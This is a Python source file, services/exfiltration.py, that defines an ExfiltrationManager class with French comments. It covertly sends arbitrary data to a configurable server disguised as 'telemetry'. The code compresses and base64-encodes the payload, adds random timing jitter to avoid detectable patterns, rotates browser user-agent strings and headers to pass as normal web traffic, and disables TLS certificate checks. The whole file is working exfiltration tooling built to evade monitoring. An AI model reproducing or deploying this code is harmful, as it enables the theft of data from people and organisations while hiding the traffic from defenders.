# services/exfiltration.py
import json
import base64
import zlib
import requests
import time
import random

class ExfiltrationManager:
    def __init__(self, server_url: str = "http://127.0.0.1:5000/telemetry"):
        self.server_url = server_url
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
        ]

    def exfiltrate(self, payload: dict) -> bool:
        """Envoie le payload avec compression, encodage et jitter."""
        try:
            # 1. Compression + base64
            json_str = json.dumps(payload)
            compressed = zlib.compress(json_str.encode())
            encoded = base64.b64encode(compressed).decode()

            # 2. Jitter aléatoire pour éviter les patterns
            time.sleep(random.uniform(0.5, 3.0))

            # 3. En-têtes imitant un navigateur
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Content-Type': 'application/json',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
            }

            # 4. Envoi avec timeout
            response = requests.post(
                self.server_url,
                json={"data": encoded},
                headers=headers,
                timeout=30,
                verify=False  # pour éviter les problèmes de certificat en local
            )
            return response.status_code == 200
        except Exception:
            return False